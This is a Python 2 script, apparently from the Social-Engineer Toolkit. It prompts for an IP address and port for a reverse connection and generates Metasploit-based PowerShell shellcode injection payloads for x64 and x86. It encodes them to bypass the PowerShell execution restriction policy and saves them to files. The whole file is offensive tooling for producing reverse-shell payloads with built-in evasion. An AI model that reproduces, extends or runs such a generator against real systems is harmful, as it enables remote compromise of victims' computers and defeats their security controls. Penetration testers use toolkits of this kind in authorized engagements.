#!/usr/bin/python
import sys
import subprocess
import re
import os
import time
from src.core.setcore import *

# grab ipaddress
if os.path.isfile("src/program_junk/ipaddr.file"):
    fileopen = file("src/program_junk/ipaddr.file", "r")
    ipaddr = fileopen.read()
else: 
    ipaddr = raw_input("Enter the ipaddress for the reverse connection: ")
    filewrite = file("src/program_junk/ipaddr.file", "w")
    filewrite.write(ipaddr)

if os.path.isfile("src/program_junk/port.options"):
    fileopen = file("src/program_junk/port.options", "r")
    port = fileopen.read()

else: 
    filewrite=file("src/program_junk/port.options", "w")
    port = raw_input("Enter the port number for the reverse [443]: ")
    if port == "":
        port = "443"
    filewrite.write(port)


powershell_inject_x64 = check_config("POWERSHELL_INJECT_PAYLOAD_X64=")
powershell_inject_x86 = check_config("POWERSHELL_INJECT_PAYLOAD_X86=")
#def metasploit_shellcode(payload):
print_status("Generating x64-based powershell injection code...")
x64 = metasploit_shellcode(powershell_inject_x64)
x64 = shellcode_replace(ipaddr,port, x64)
x64 = generate_powershell_alphanumeric_payload(powershell_inject_x64, ipaddr, port, x64)

print_status("Generating x86-based powershell injection code...")
x86 = metasploit_shellcode(powershell_inject_x86)
x86 = shellcode_replace(ipaddr, port, x86)
x86 = generate_powershell_alphanumeric_payload(powershell_inject_x86, ipaddr, port, x86)

# check to see if we want to display the powershell command to the user
verbose = check_config("POWERSHELL_VERBOSE=")
if verbose.lower() == "on":
    print_status("Printing the x64 based encoded code...")
    time.sleep(3)
    print x64
    print_status("Printing the x86 based encoded code...")
    time.sleep(3)
    print x86

filewrite = file("src/program_junk/x64.powershell", "w")
filewrite.write(x64)
filewrite.close()
filewrite = file("src/program_junk/x86.powershell", "w")
filewrite.write(x86)
filewrite.close()
print_status("Finished generating powershell injection bypass.")
print_status("Encoded to bypass exececution restriction policy...")
